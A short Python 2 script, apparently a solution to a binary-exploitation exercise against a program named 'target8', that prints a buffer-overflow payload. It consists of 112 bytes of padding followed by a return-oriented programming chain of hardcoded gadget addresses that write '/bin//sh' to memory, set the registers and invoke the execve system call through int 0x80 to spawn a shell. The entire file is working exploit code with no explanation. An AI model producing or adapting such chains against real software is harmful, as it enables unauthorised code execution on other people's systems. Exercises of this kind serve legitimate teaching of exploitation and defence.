#!/usr/bin/env python2
#HOW IT SHOULD BE RAN
#./target8 "$(python sol8.py)"
from struct import pack

p = 'A'*112

p += pack('<I', 0x080572fa) # pop edx ; ret
p += pack('<I', 0x080ef060) # @ .data
p += pack('<I', 0x080c2316) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0808e93d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080572fa) # pop edx ; ret
p += pack('<I', 0x080ef064) # @ .data + 4
p += pack('<I', 0x080c2316) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0808e93d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080572fa) # pop edx ; ret
p += pack('<I', 0x080ef068) # @ .data + 8
p += pack('<I', 0x08051710) # xor eax, eax ; ret
p += pack('<I', 0x0808e93d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481ec) # pop ebx ; ret
p += pack('<I', 0x080ef060) # @ .data
p += pack('<I', 0x080e3cc6) # pop ecx ; ret
p += pack('<I', 0x080ef068) # @ .data + 8
p += pack('<I', 0x080572fa) # pop edx ; ret
p += pack('<I', 0x080ef068) # @ .data + 8
p += pack('<I', 0x08051710) # xor eax, eax ; ret
p += pack('<I', 0x0809a506) # inc eax ; ret
p += pack('<I', 0x0809a506) # inc eax ; ret
p += pack('<I', 0x0809a506) # inc eax ; ret
p += pack('<I', 0x0809a506) # inc eax ; ret
p += pack('<I', 0x0809a506) # inc eax ; ret
p += pack('<I', 0x0809a506) # inc eax ; ret
p += pack('<I', 0x0809a506) # inc eax ; ret
p += pack('<I', 0x0809a506) # inc eax ; ret
p += pack('<I', 0x0809a506) # inc eax ; ret
p += pack('<I', 0x0809a506) # inc eax ; ret
p += pack('<I', 0x0809a506) # inc eax ; ret
p += pack('<I', 0x080494b9) # int 0x80

print p
